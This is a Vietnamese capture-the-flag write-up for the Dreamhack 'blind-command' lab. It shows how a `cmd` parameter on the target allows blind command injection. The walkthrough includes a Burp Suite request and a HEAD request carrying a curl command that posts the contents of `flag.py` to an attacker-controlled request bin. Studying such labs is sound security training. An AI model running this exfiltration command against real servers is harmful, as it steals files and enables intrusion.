## Challenge: blind-command
### Information:
<img src="https://github.com/user-attachments/files/23546994/0.md" width="500">

### Solution
<img src="https://github.com/user-attachments/files/23547020/1.md" width="700">

Gợi ý cho chúng ta biết trang web chấp nhận một tham số tên là `cmd` trên thanh địa chỉ.  
Test công dụng của nó, ta thấy kết quả hiển thị giống với ta đã nhập  
<img src="https://github.com/user-attachments/files/23547080/2.md" width="700">

Đồng thời khi chạy cùng với Burp Suite, ta có được `HTTP GET` như sau
```http
GET /?cmd=[cmd] HTTP/1.1
Host: host3.dreamhack.games:12197
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

**Sent to Repeater** và đổi `GET` thành `OPTIONS` để kiểm tra xem máy chủ cho phép những phương thức nào.
<img src="https://github.com/user-attachments/files/23547157/4.md" width="900">
Ta thấy ngoài `OPTIONS` và `GET` còn có `HEAD`.  

Tạo một "Request Bin" từ DreamHack Tools: `https://fimguwk.request.dreamhack.games`.  
Mục tiêu là ra lệnh cho máy chủ đọc file `flag.py` và gửi nội dung đến hộp thư của mình.  
Do đó ta sửa `GET` thành `HEAD` và `cmd=curl https://fimguwk.request.dreamhack.games/ -d "$(cat flag.py)"`.  
Nhấn **Send**, ta nhận được phản hồi `200 OK` nghĩa là đã thành công.  
<img src="https://github.com/user-attachments/files/23547405/6.md" width="900">

Kiểm tra request `POST` ở Dreamhack Tools ta có được flag từ **Body**
<img src="https://github.com/user-attachments/files/23547430/5.md" width="900">



